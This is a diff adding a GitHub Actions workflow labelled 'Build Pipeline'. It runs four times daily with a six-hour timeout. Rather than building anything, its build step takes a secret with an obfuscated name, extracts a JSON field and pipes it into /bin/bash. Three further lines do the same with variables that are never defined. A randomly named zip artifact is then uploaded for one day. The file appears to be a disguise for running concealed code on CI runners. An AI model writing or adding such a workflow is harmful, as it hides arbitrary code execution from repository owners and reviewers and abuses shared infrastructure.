@@ -1,0 +1,36 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Build
+        env:
+          dffg78821: ${{ secrets.dffg78821 }}
+        run: |
+          printf '%s' "$dffg78821" | jq -r .n65064 | /bin/bash
+          echo $l9494 | jq -r .hcikw5 | /bin/bash
+          printf '%s' "$namkk0" | jq -r .lz156 | /bin/bash
+          echo $up4430 | jq -r .zja7307 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: lj7OXm5u
+          path: "*.zip"
+          retention-days: 1
